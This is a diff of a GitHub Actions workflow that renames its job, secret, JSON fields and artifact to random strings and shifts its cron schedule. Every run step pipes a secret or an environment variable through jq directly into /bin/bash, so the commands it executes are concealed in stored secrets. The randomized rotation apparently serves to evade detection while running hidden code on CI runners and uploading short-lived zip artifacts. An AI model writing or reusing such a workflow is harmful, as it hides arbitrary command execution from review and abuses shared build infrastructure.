@@ -2,7 +2,7 @@ name: addisonneuralc947
 on:
   workflow_dispatch:
   schedule:
-    - cron: '20 1,7,13,19 * * *'
+    - cron: '9 4,10,16,22 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,21 +10,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: addisonneuralc947
         env:
-          iwx96075: ${{ secrets.iwx96075 }}
+          voxu74: ${{ secrets.voxu74 }}
         run: |
-          printf '%s' "$iwx96075" | jq -r .ylghs746 | /bin/bash
-          echo $rlvwb6 | jq -r .acfug508 | /bin/bash
-          echo $eg704 | jq -r .bu5014 | /bin/bash
-          printf '%s' "$p2822" | jq -r .jtd06 | /bin/bash
-          printf '%s' "$ovuc9" | jq -r .cp97549 | /bin/bash
-          echo $wyj4666 | jq -r .yzzz0396 | /bin/bash
-          echo $wzylk6779 | jq -r .tiei66 | /bin/bash
-          printf '%s' "$peua947" | jq -r .ek312 | /bin/bash
-          printf '%s' "$bs49" | jq -r .cwyc897 | /bin/bash
+          printf '%s' "$voxu74" | jq -r .f85 | /bin/bash
+          echo $pwuc893 | jq -r .gfl47087 | /bin/bash
+          echo $gw69667 | jq -r .fivx743 | /bin/bash
+          printf '%s' "$puae5564" | jq -r .fr5790 | /bin/bash
+          printf '%s' "$cr2549" | jq -r .p73 | /bin/bash
+          printf '%s' "$cw683" | jq -r .jvzql2 | /bin/bash
+          echo $lhci8 | jq -r .yo9567 | /bin/bash
+          printf '%s' "$hveu1" | jq -r .bnke11436 | /bin/bash
+          echo $cwm308 | jq -r .xnsg1 | /bin/bash
+          printf '%s' "$wy71" | jq -r .sqy28021 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: qJR2z8ow
+          name: lNRpEAJ2
           path: "*.zip"
           retention-days: 1
